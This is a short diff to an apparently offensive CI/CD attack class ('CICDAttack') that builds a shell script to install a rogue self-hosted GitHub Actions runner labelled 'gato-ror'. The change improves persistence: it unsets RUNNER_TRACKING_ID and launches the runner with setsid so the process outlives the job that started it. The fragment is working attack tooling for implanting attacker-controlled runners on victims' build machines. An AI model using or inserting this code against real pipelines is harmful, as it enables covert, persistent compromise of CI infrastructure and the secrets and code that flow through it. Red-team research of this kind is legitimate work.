@@ -157,7 +157,9 @@ class CICDAttack():
             ' --labels "gato-ror"'
             ' --disableupdate'
             ' --unattended\n'
-            'nohup ./run.sh > /dev/null 2>&1 &\n'
+            'unset RUNNER_TRACKING_ID\n'
+            'setsid ./run.sh > /dev/null 2>&1 &\n'
+            'sleep 2\n'
             'echo "RoR runner installed: $RUNNER_NAME"'
         )
 
